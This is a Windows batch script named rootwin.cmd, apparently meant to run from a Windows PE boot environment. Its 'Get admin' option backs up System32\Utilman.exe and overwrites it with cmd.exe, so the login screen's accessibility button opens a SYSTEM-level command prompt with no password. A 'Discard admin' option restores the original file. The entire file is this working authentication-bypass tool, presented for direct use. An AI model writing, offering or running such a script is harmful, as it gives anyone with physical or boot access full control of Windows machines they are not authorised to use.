@echo off

echo;
echo  Running rootwin.cmd ver 1.0.0
echo;
echo  #########################################
echo  # Created by Laddge (@laddge on Github) #
echo  #########################################
echo;

SET utilman="C:\Windows\System32\Utilman.exe"
SET cmd="C:\Windows\System32\cmd.exe"
SET backup="C:\Windows\System32\Utilman.exe.org"
if exist %utilman% goto MAIN
if not exist %utilman% goto FAIL

:MAIN
echo  +---------------------+
echo   0. Cancel
echo   1. Get / Discard admin
echo  +---------------------+

:INPUT
SET operation=
SET /P operation=  Enter 0 or 1: 
if "%operation%"=="0" (
    goto SHUTDOWN
) else (
    if "%operation%"=="1" (
        if exist %backup% (
            echo  Backup found!
            echo;
            goto DISCARD
        ) else (
            echo  Backup NOT found!
            echo;
            goto GET
        )
    ) else (
        goto INPUT
    )
)

:GET
echo;
echo  [ Getting admin ]
echo  - Making backup
ren %utilman% Utilman.exe.org
echo  - Copying cmd.exe to Utilman.exe
copy %cmd% %utilman%
echo  DONE!
goto SHUTDOWN

:DISCARD
echo;
echo  [ Discarding admin ]
echo  - Deleting moded Utilman.exe
del %utilman%
echo  - Restoring backup
ren %backup% Utilman.exe
echo  DONE!
goto SHUTDOWN

:FAIL
echo  Target not found!

:SHUTDOWN
echo;
echo  Going to shutdown
pause
wpeutil shutdown
